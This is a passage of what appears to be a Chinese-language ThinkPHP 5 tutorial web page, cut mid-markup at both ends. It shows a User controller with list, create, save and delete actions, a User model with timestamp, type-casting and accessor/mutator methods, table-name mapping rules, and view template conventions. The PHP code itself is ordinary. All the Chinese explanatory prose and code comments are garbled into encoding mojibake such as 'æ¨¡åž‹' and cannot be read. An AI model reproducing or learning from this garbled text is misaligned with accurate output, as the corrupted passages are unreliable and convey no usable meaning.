=====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// User::all() æ˜¯æ¨¡å‹ User ç»§æ‰¿è‡ª think\Model çš„é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// ç”¨äºæŸ¥è¯¢ user è¡¨çš„æ‰€æœ‰æ•°æ®ï¼Œè¿”å›ä¸€ä¸ªæ¨¡å‹é›†åˆï¼ˆCollectionï¼‰</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šè¿™é‡Œçš„ User æ˜¯æ¨¡å‹ç±»ï¼Œè€Œä¸æ˜¯å½“å‰æ§åˆ¶å™¨ç±»ï¼Œå› ä¸ºä¸Šé¢ use è¯­å¥å¯¼å…¥äº†æ¨¡å‹</span></span><br><span class="line">        <span class="variable">$users</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">all</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¸²æŸ“æ¨¡æ¿ï¼šapplication/index/view/user/index.html</span></span><br><span class="line">        <span class="comment">// å¹¶ä¼ å…¥å˜é‡ $users åˆ°æ¨¡æ¿ä¸­ï¼ˆå¯ç”¨ &#123;$users&#125; è®¿é—®ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="variable">$users</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== æ·»åŠ ç”¨æˆ·è¡¨å•é¡µé¢ =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// æ¸²æŸ“æ¨¡æ¿ create.htmlï¼ˆè·¯å¾„åŒä¸Šï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;create&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== æäº¤è¡¨å•å¹¶ä¿å­˜ç”¨æˆ· =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰ POST æäº¤çš„å­—æ®µï¼ˆé»˜è®¤è¿”å›æ•°ç»„ï¼‰</span></span><br><span class="line">        <span class="comment">// input(&#x27;post.&#x27;) æ˜¯ TP5 çš„å…¨å±€åŠ©æ‰‹å‡½æ•°ï¼Œè·å– POST å‚æ•°</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨è‡ªåŠ¨éªŒè¯ï¼ˆThinkPHP5 æ¨èæ–¹å¼ï¼‰</span></span><br><span class="line">        <span class="comment">// validate(&#x27;index/User&#x27;) ä¼šè‡ªåŠ¨åŠ è½½ application/index/validate/User.php</span></span><br><span class="line">        <span class="variable">$validate</span> = <span class="title function_ invoke__">validate</span>(<span class="string">&#x27;index/User&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$validate</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœéªŒè¯å¤±è´¥ï¼Œè¿”å›é”™è¯¯æç¤ºå¹¶è·³è½¬å›å‰é¡µ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$validate</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ¨¡å‹å¹¶å†™å…¥æ•°æ®åº“ï¼ˆç­‰ä»·äº INSERTï¼‰</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šå¯ä»¥ç”¨ User::create($data)ï¼Œè¿™é‡Œåªæ˜¯å†™æ³•ä¸åŒï¼Œå«ä¹‰ä¸€è‡´</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™å…¥æˆåŠŸåè·³è½¬åˆ°ç”¨æˆ·åˆ—è¡¨é¡µï¼Œå¹¶æ˜¾ç¤ºæˆåŠŸæç¤º</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;user/index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===================== åˆ é™¤ç”¨æˆ· =====================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å…ˆåˆ¤æ–­ id åˆæ³•æ€§ï¼ˆé˜²æ­¢éæ³•æ³¨å…¥ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;å‚æ•°éæ³•&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User::destroy($id) æ˜¯æ¡†æ¶æä¾›çš„å¿«æ·åˆ é™¤æ–¹æ³•ï¼Œä¸»é”®åˆ é™¤</span></span><br><span class="line">        <span class="title class_">User</span>::<span class="title function_ invoke__">destroy</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ é™¤åè·³è½¬å›ç”¨æˆ·åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;user/index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="Modelï¼šæ¨¡å‹å±‚ï¼ˆæ•°æ®è®¿é—®ä¸å°è£…ï¼‰"><a href="#Modelï¼šæ¨¡å‹å±‚ï¼ˆæ•°æ®è®¿é—®ä¸å°è£…ï¼‰" class="headerlink" title="Modelï¼šæ¨¡å‹å±‚ï¼ˆæ•°æ®è®¿é—®ä¸å°è£…ï¼‰"></a>Modelï¼šæ¨¡å‹å±‚ï¼ˆæ•°æ®è®¿é—®ä¸å°è£…ï¼‰</h4><p>åœ¨ ThinkPHP ä¸­ï¼Œ<strong>æ¨¡å‹ï¼ˆModelï¼‰æ˜¯æ•°æ®åº“çš„é¢å‘å¯¹è±¡å°è£…</strong>ï¼Œæ¯ä¸€ä¸ªæ¨¡å‹ç±»é€šå¸¸å¯¹åº”ä¸€å¼ æ•°æ®åº“è¡¨ï¼Œå®ƒæä¾›äº†æ•°æ®è¡¨ç»“æ„çš„æ˜ å°„ï¼Œå­—æ®µçš„ç±»å‹è½¬æ¢ï¼Œæ•°æ®éªŒè¯ã€è®¿é—®ã€ä¿®æ”¹ç­‰ã€‚æ¨¡å‹å±‚æœ¬è´¨ä¸Šæ˜¯å¯¹å¢åˆ æ”¹æŸ¥ç­‰æ“ä½œçš„å°è£…ï¼Œå› æ­¤ä½ å¯ä»¥åƒæ“ä½œå¯¹è±¡ä¸€æ ·å»æ“ä½œæ•°æ®åº“ã€‚</p>
<p>åœ¨ ThinkPHP ä¸­ï¼Œæ¨¡å‹å±‚çš„å¯¹è±¡éœ€è¦ç»§æ‰¿äº <code>think\Model</code>ã€‚<code>think\Model</code> æ˜¯ ThinkPHP çš„æ ¸å¿ƒæ¨¡å‹åŸºç±»ï¼Œå†…ç½®äº†å¾ˆå¤šæ¨¡å‹å±‚å¸¸ç”¨çš„åŠŸèƒ½ï¼Œå¦‚ï¼š</p>
<ul>
<li>æ•°æ®åº“ CURD æ–¹æ³•ï¼ˆ<code>get</code>ã€<code>all</code>ã€<code>save</code>ã€<code>destroy</code> ç­‰ï¼‰</li>
<li>ç±»å‹è½¬æ¢ï¼ˆ<code>$type</code> å±æ€§ï¼‰</li>
<li>è‡ªåŠ¨æ—¶é—´æˆ³å†™å…¥ï¼ˆ<code>$autoWriteTimestamp</code>ï¼‰</li>
<li>è®¿é—®å™¨ä¸ä¿®æ”¹å™¨ï¼ˆ<code>getXxxAttr()</code> &#x2F; <code>setXxxAttr()</code>ï¼‰</li>
<li>äº‹ä»¶ï¼ˆbeforeInsertã€afterDelete ç­‰ï¼‰</li>
</ul>
<p>è€Œæˆ‘ä»¬åœ¨ç¼–å†™æ¨¡å‹å±‚ä»£ç çš„æ—¶å€™å®é™…ä¸Šå°±æ˜¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚ç»§æ‰¿å¡« <code>think\Model</code> ç±»å¹¶å……çš„å­—æ®µä»¥åŠé‡å†™æ–¹æ³•ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢çš„ <code>application/index/model/User.php</code> é’ˆå¯¹çš„æ˜¯æ•°æ®åº“ä¸­çš„ user è¡¨ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è®¾ç½®è¯¥ç±»çš„å‘½åç©ºé—´ï¼Œå¿…é¡»ä¸ç›®å½•ç»“æ„å¯¹åº”ï¼šapplication/index/model</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">application</span>\<span class="title class_">index</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•å…¥ ThinkPHP æ¡†æ¶çš„æ¨¡å‹åŸºç±»ï¼ˆORM æ“ä½œçš„æ ¸å¿ƒï¼‰</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ User æ¨¡å‹ç±»ï¼Œç”¨äºæ“ä½œæ•°æ®åº“ä¸­çš„ user è¡¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è‡ªåŠ¨å†™å…¥æ—¶é—´æˆ³å­—æ®µ</span></span><br><span class="line"><span class="comment">     * - è®¾ç½®ä¸º &#x27;datetime&#x27;ï¼Œè¡¨ç¤ºå†™å…¥ä¸º Y-m-d H:i:s æ ¼å¼</span></span><br><span class="line"><span class="comment">     * - è¯¥åŠŸèƒ½ä¼šè‡ªåŠ¨ç»´æŠ¤ create_time å’Œ update_time ä¸¤ä¸ªå­—æ®µï¼ˆå¦‚æœä½ è¡¨ä¸­æœ‰ï¼‰</span></span><br><span class="line"><span class="comment">     * - å®é™…æ’å…¥æ•°æ®æ—¶ä¸éœ€è¦ä½ æ‰‹åŠ¨è®¾ç½®è¿™ä¸¤ä¸ªå­—æ®µ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autoWriteTimestamp</span> = <span class="string">&#x27;datetime&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç±»å‹è½¬æ¢è®¾ç½®</span></span><br><span class="line"><span class="comment">     * - å½“ä»æ•°æ®åº“ä¸­æŸ¥è¯¢æ•°æ®åï¼Œæ¡†æ¶ä¼šè‡ªåŠ¨å°†è¿™äº›å­—æ®µè½¬æ¢ä¸ºæŒ‡å®šçš„ç±»å‹</span></span><br><span class="line"><span class="comment">     * - é¿å…ç±»å‹é”™è¯¯ï¼Œä¾‹å¦‚æ•°æ®åº“è¿”å›å­—ç¬¦ä¸²è€Œä½ æœŸæœ›ä½¿ç”¨æ•´æ•°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>   =&gt; <span class="string">&#x27;integer&#x27;</span>, <span class="comment">// è‡ªåŠ¨è½¬æ¢ id å­—æ®µä¸ºæ•´æ•°</span></span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;string&#x27;</span>,  <span class="comment">// æ˜ç¡® name å­—æ®µä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­—æ®µè®¿é—®å™¨ï¼ˆgetNameAttrï¼‰</span></span><br><span class="line"><span class="comment">     * - æ¯æ¬¡é€šè¿‡ $user-&gt;name è·å– name å­—æ®µæ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment">     * - ç”¨äºâ€œæ ¼å¼åŒ–æ˜¾ç¤ºâ€çš„åœºæ™¯ï¼Œæ¯”å¦‚è¿™é‡Œå°†ç”¨æˆ·åç»Ÿä¸€å˜æˆå¤§å†™</span></span><br><span class="line"><span class="comment">     * - æ³¨æ„å‘½åè§„åˆ™ï¼šget + å­—æ®µåé¦–å­—æ¯å¤§å†™ + Attr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNameAttr</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­—æ®µä¿®æ”¹å™¨ï¼ˆsetNameAttrï¼‰</span></span><br><span class="line"><span class="comment">     * - æ¯æ¬¡ç»™ $user-&gt;name èµ‹å€¼æˆ–é€šè¿‡ create/save å†™å…¥æ•°æ®æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment">     * - ç”¨äºâ€œæ ¼å¼åŒ–å­˜å‚¨â€çš„åœºæ™¯ï¼Œæ¯”å¦‚è¿™é‡Œè‡ªåŠ¨å»é™¤å‰åç©ºæ ¼</span></span><br><span class="line"><span class="comment">     * - å‘½åè§„åˆ™ï¼šset + å­—æ®µåé¦–å­—æ¯å¤§å†™ + Attr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNameAttr</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ ThinkPHP 5 ä¸­ï¼Œ<strong>æ¨¡å‹ç±»é»˜è®¤ä¼šè‡ªåŠ¨æ˜ å°„åˆ°æ•°æ®åº“ä¸­çš„æŸå¼ è¡¨</strong>ï¼Œè¿™ä¸ªæ˜ å°„æ˜¯<strong>åŸºäºçº¦å®š</strong>è¿›è¡Œçš„ã€‚é»˜è®¤æ˜ å°„è§„åˆ™å¦‚ä¸ºï¼š</p>
<ul>
<li><strong>ç±»åå»æ‰å‘½åç©ºé—´éƒ¨åˆ†</strong></li>
<li><strong>å°†é©¼å³°å‘½åè½¬æ¢ä¸ºä¸‹åˆ’çº¿é£æ ¼</strong></li>
<li><strong>è½¬ä¸ºå°å†™</strong></li>
<li><strong>æ·»åŠ æ•°æ®åº“é…ç½®ä¸­çš„å‰ç¼€ï¼ˆå¦‚ tp_ï¼‰</strong></li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<table>
<thead>
<tr>
<th>æ¨¡å‹ç±»å</th>
<th>é»˜è®¤å¯¹åº”è¡¨å</th>
</tr>
</thead>
<tbody><tr>
<td><code>User</code></td>
<td><code>tp_user</code></td>
</tr>
<tr>
<td><code>UserInfo</code></td>
<td><code>tp_user_info</code></td>
</tr>
<tr>
<td><code>OrderDetailItem</code></td>
<td><code>tp_order_detail_item</code></td>
</tr>
</tbody></table>
<p>å…¶ä¸­å‡è®¾ä½ çš„æ•°æ®åº“é…ç½®ä¸­å®šä¹‰äº†å‰ç¼€ <code>tp_</code>ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config/database.php</span></span><br><span class="line"><span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;tp_&#x27;</span>,</span><br></pre></td></tr></table></figure></div>

<p>å½“ç„¶å¦‚æœä½ æƒ³<strong>æ‰‹åŠ¨æŒ‡å®šæ¨¡å‹å¯¹åº”çš„è¡¨å</strong>ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼ï¼š</p>
<ul>
<li><p>ä½¿ç”¨ <code>$name</code> å±æ€§ï¼ˆé€»è¾‘è¡¨åï¼Œä¾ç„¶ä¼šåŠ å‰ç¼€ï¼‰</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;member&#x27;</span>; <span class="comment">// æœ€ç»ˆæ˜ å°„åˆ° tp_member è¡¨ï¼ˆå— prefix å½±å“ï¼‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ä½¿ç”¨ <code>$table</code> å±æ€§ï¼ˆç»å¯¹è¡¨åï¼Œä¸åŠ å‰ç¼€ï¼‰</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;custom_user_table&#x27;</span>; <span class="comment">// ç›´æ¥ä½¿ç”¨å®Œæ•´è¡¨å</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="Viewï¼šè§†å›¾å±‚ï¼ˆé¡µé¢å±•ç¤ºï¼‰"><a href="#Viewï¼šè§†å›¾å±‚ï¼ˆé¡µé¢å±•ç¤ºï¼‰" class="headerlink" title="Viewï¼šè§†å›¾å±‚ï¼ˆé¡µé¢å±•ç¤ºï¼‰"></a>Viewï¼šè§†å›¾å±‚ï¼ˆé¡µé¢å±•ç¤ºï¼‰</h4><p>åœ¨ ThinkPHP ä¸­ï¼Œè§†å›¾å±‚è´Ÿè´£å°†æ•°æ®ä»¥ HTML å½¢å¼å±•ç°ç»™ç”¨æˆ·ã€‚å½“ä½ åœ¨æ§åˆ¶å™¨ä¸­è°ƒç”¨ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// æˆ–è€… $this-&gt;fetch(&#x27;index&#x27;)</span></span><br></pre></td></tr></table></figure></div>

<p>æ¡†æ¶ä¼šæ ¹æ®ä»¥ä¸‹<strong>é»˜è®¤çº¦å®šè·¯å¾„è§„åˆ™</strong>å»æŸ¥æ‰¾è§†å›¾æ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">â””â”€â”€ [æ¨¡å—å]/</span><br><span class="line">    â””â”€â”€ view/</span><br><span class="line">        â””â”€â”€ [æ§åˆ¶å™¨åï¼ˆå°å†™ï¼‰]/</span><br><span class="line">            â””â”€â”€ [æ“ä½œæ–¹æ³•å].html</span><br></pre></td></tr></table></figure></div>

<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">â””â”€â”€ index/</span><br><span class="line">    â””â”€â”€ view/</span><br><span class="line">        â””â”€â”€ user/</span><br><span class="line">            â”œâ”€â”€ index.html    â† å¯¹åº” User æ§åˆ¶å™¨çš„ index() æ–¹æ³•</span><br><span class="line">            â”œâ”€â”€ create.html   â† å¯¹åº” User æ§åˆ¶å™¨çš„ create() æ–¹æ³•</span><br></pre></td></tr></table></figure></div>

<p>æ¡†æ¶æ ¹æ®æ§åˆ¶å™¨å + æ–¹æ³•åæ¥è‡ªåŠ¨åŒ¹é…è§†å›¾æ–‡ä»¶ã€‚</p>
<ul>
<li><code>User::index()</code> â†’ æ¸²æŸ“ <code>view/user/index.html</code></li>
<li><code>User::create()</code> â†’ æ¸²æŸ“ <code>view/user/create.html</code></li>
</ul>
<p>ThinkPHP ä½¿ç”¨çš„æ˜¯ <strong>ThinkTemplate æ¨¡æ¿å¼•æ“</strong>ï¼Œæ”¯æŒå˜é‡è¾“å‡ºã€æ¡ä»¶è¯­å¥ã€å¾ªç¯è¯­å¥ã€URL ç”Ÿæˆç­‰ï¼Œè¯­æ³•æ¸…æ™°æ˜“è¯»ï¼Œé€‚åˆå¿«é€Ÿå¼€å‘ã€‚</p>
<p>è§†å›¾æ¸²æŸ“ç”±æ§åˆ¶å™¨å®Œæˆï¼Œä½¿ç”¨ <code>$this-&gt;fetch()</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="variable">$users</span>]);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¨¡æ¿æ–‡ä»¶åï¼ˆçœç•¥ <code>.html</code>ï¼‰</li>
<li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ é€’ç»™æ¨¡æ¿çš„å˜é‡æ•°ç»„</li>
</ul>
<p>ä½ å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ <code>&#123;$users&#125;</code> æ¥è®¿é—®ä¼ å…¥çš„æ•°æ®ã€‚å¸¸è§è¯­æ³•æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>è¯­æ³•ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>å˜é‡è¾“å‡º</td>
<td><code>&#123;$user.name&#125;</code></td>
</tr>
<tr>
<td>æ¡ä»¶åˆ¤æ–­</td>
<td><code>&#123;if $user.name == &#39;admin&#39;&#125;...&#123;/if&#125;</code></td>
</tr>
<tr>
<td>å¾ªç¯è¾“å‡º</td>
<td><code>&#123;volist name=&quot;users&quot; id=&quot;user&quot;&#125;...&#123;/volist&#125;</code></td>
</tr>
<tr>
<td>URL ç”Ÿæˆ</td>
<td><code>&#123;:url(&#39;user/delete&#39;, [&#39;id&#39; =&gt; $user.id])&#125;</code></td>
</tr>
<tr>
<td>æ¨¡æ¿ç»§æ‰¿</td>
<td><code>&#123;extend name=&quot;layout&quot;&#125;</code></td>
</tr>
<tr>
<td>æ¨¡æ¿å—å®šä¹‰</td>
<td><code>&#123;block name=&quot;title&quot;&#125;æ ‡é¢˜&#123;/block&#125;</code></td>
</tr>
</tbody></table>
<h3 id="å¤šæ¨¡å—æ¨¡å¼"><a href="#å¤šæ¨¡å—æ¨¡å¼" class="headerlink" title="å¤šæ¨¡å—æ¨¡å¼"></a>å¤šæ¨¡å—æ¨¡å¼</h3><p><strong>å¤šæ¨¡å—æ¨¡å¼</strong>æ˜¯æŒ‡ ThinkPHP å°†åº”ç”¨åˆ’åˆ†ä¸ºå¤šä¸ªâ€œæ¨¡å—â€ï¼Œæ¯ä¸ªæ¨¡å—å…·å¤‡å®Œæ•´çš„ MVC ç»“æ„ï¼Œç‹¬ç«‹å¼€å‘å’Œéƒ¨ç½²ã€‚è¿™æ ·å¯ä»¥<strong>æ”¯æŒé¡¹ç›®å¤æ‚æ€§æ‹†åˆ†ã€èŒè´£éš”ç¦»ã€å›¢é˜Ÿåä½œ</strong>ï¼Œä»¥åŠæ¯ä¸ªå­ç³»ç»Ÿçš„ç‹¬ç«‹æ€§ã€‚å¤šä¸ªæ¨¡å—ä¹‹é—´å®Œå…¨è§£è€¦ï¼Œå¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å‡å°‘å†²çªï¼Œæå‡ä»£ç çš„å¯é‡ç”¨æ€§ã€‚æ¯ä¸ªæ¨¡å—å¯ä»¥æœ‰ç‹¬ç«‹çš„é…ç½®ï¼Œä¾‹å¦‚æ•°æ®åº“è¿æ¥ã€ç¼“å­˜è®¾ç½®ç­‰ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªç›®å½•ç»“æ„ä¸­å®šä¹‰äº†ä¸‰ä¸ªæ¨¡å—ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">application/              â† å‰å°å±•ç¤ºï¼ˆç”¨æˆ·è®¿é—®çš„ç½‘ç«™é¡µé¢ï¼‰</span><br><span class="line">â”œâ”€â”€ index/</span><br><span class="line">â”‚   â”œâ”€â”€ controller/       â† æ§åˆ¶å™¨ç±»ï¼Œå¦‚ Index.php</span><br><span class="line">â”‚   â”œâ”€â”€ model/            â† æ¨¡å‹ç±»ï¼Œå¦‚ User.php</span><br><span class="line">â”‚   â””â”€â”€ view/             â† æ¨¡æ¿è§†å›¾æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ admin/                â† åå°ç®¡ç†ï¼ˆç®¡ç†å‘˜æ“ä½œç³»ç»Ÿï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ controller/       â† åå°æ§åˆ¶å™¨ï¼Œå¦‚ Dashboard.php</span><br><span class="line">â”‚   â”œâ”€â”€ model/</span><br><span class="line">â”‚   â””â”€â”€ view/</span><br><span class="line">â”œâ”€â”€ api/                  â† å¯¹å¤–æä¾›çš„æ¥å£æœåŠ¡ï¼ˆå¦‚ APP æ¥å£ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ controller/       â† API æ§åˆ¶å™¨ï¼Œå¦‚ User.php</span><br><span class="line">â”‚   â””â”€â”€ model/</span><br><span 